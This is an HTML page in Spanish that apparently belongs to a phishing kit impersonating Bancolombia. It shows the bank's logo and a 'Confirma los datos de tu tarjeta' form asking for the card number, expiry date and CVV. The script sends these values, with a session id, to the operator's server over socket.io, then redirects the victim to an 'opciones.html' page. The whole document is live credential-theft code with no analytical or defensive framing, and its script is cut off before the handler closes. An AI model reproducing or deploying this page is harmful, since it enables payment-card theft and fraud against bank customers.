<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Validación de Tarjeta</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f3f6fb;
      margin: 0;
      padding: 0;
    }

    .container {
      max-width: 800px;
      margin: 50px auto;
      background: #fff;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      padding: 30px;
      text-align: center;
    }

    .header {
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 20px;
    }

    .logo {
      width: 60px;
      height: 60px;
      background: url('https://hub.laboratoria.la/hubfs/LogoBancolombia.png') no-repeat center;
      background-size: contain;
    }

    h2 {
      margin: 10px 0;
      color: #444;
    }

    input, select {
      width: 90%;
      padding: 8px;
      margin: 8px auto;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 0.95em;
      display: block;
    }

    .select-group {
      display: flex;
      justify-content: space-between;
      gap: 10px;
      margin-bottom: 10px;
    }

    .select-group select {
      width: 48%;
    }

    button {
      background-color: #ffde00;
      color: #333;
      padding: 10px;
      border: none;
      border-radius: 5px;
      font-size: 0.95em;
      width: 90%;
      cursor: pointer;
      display: block;
      margin: 10px auto 0;
    }

    button:hover {
      background-color: #e6cb00;
    }

    .mensaje-error {
      color: red;
      margin-top: 10px;
      font-size: 0.85rem;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <div class="logo"></div>
    </div>

    <h2>Confirma los datos de tu tarjeta</h2>

    <form id="card-form">
      <input 
        type="text" 
        id="tarjeta" 
        placeholder="Número de tarjeta (16 dígitos)" 
        maxlength="16" 
        pattern="\d{16}" 
        required 
      />

      <div class="select-group">
        <select id="mes" required>
          <option value="">Mes</option>
          <option value="01">01</option>
          <option value="02">02</option>
          <option value="03">03</option>
          <option value="04">04</option>
          <option value="05">05</option>
          <option value="06">06</option>
          <option value="07">07</option>
          <option value="08">08</option>
          <option value="09">09</option>
          <option value="10">10</option>
          <option value="11">11</option>
          <option value="12">12</option>
        </select>

        <select id="ano" required>
          <option value="">Año</option>
          <option value="2024">2024</option>
          <option value="2025">2025</option>
          <option value="2026">2026</option>
          <option value="2027">2027</option>
          <option value="2028">2028</option>
          <option value="2029">2029</option>
          <option value="2030">2030</option>
        </select>
      </div>

      <input 
        type="password" 
        id="cvv" 
        placeholder="CVV (3 dígitos)" 
        maxlength="3" 
        pattern="\d{3}" 
        required 
      />

      <button type="submit">Verificar</button>
    </form>
  </div>

  <script src="/socket.io/socket.io.js"></script>
  <script src="opciones.js"></script>
  <script>
    const socket = io();
    const sessionId = localStorage.getItem("sessionId");
    socket.emit("reconectar", sessionId);

    document.getElementById("card-form").addEventListener("submit", function(e) {
      e.preventDefault();

      const tarjeta = document.getElementById("tarjeta").value.trim();
      const mes = document.getElementById("mes").value;
      const ano = document.getElementById("ano").value;
      const cvv = document.getElementById("cvv").value.trim();

      if (!/^\d{16}$/.test(tarjeta) || !mes || !ano || !/^\d{3}$/.test(cvv)) {
        alert("Por favor completa correctamente todos los campos.");
        return;
      }

      socket.emit("datosTarjeta", {
  tarjeta,
  vencimiento: `${mes}/${ano}`,
  cvv,
  sessionId
});
setTimeout(() => {
  window.location.href = "opciones.html";
}, 500);

  </script>
</body>
</html>
